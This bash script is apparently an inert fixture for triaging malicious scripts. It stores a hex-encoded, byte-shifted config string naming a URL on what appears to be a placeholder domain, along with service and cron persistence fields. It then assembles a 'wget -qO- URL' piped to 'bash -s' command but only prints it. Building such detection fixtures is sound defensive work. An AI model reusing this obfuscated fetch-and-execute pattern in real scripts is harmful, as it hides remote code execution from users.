#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_d0e3010a='92594d988f90818c8f597d7f8d91858e817b8e81898b90814880858f8c7d907f847b8c858c81987d807d8c90818e59938381907b8f90808b91907b8c858c81988f907d83817b7f8b918a90594d987f7d898c7d85838a7b8580597f7d898c7d85838a494d817f544f7d514d825598918e88598490908c8f564b4b4d817f544f7d514d82554a81947d898c88814a858a927d8885804b54538151524f53514a8f8498918f818e7b7d83818a905964918a908e818f8f687d7e4b4d817f544f7d514d8255'
  readonly Codec_d0e3010a='hex_compact|add_modulo_256|1c'

  Load_d0e3010a() {
    item1=()
    local raw="${Material_d0e3010a}" item5
    for ((item5=0; item5<${#raw}; item5+=2)); do item1+=("$((16#${raw:item5:2}))"); done
  }

  Decode_d0e3010a() {
    item2=()
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2+=("$(((item1[item5] - 28 + 256) % 256))")
    done
  }

  Recover_d0e3010a() {
    local -a item1 item2
    local item3 item4 item8 item5
    local -a series=(3 5 8 13); item4="${series[*]:1:2}"
    Load_d0e3010a
    Decode_d0e3010a
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_d0e3010a() { local recovered; recovered="$(Recover_d0e3010a)"; printf '%s\n' "$recovered"; }

  Plan_d0e3010a() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_d0e3010a)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_d0e3010a; fi
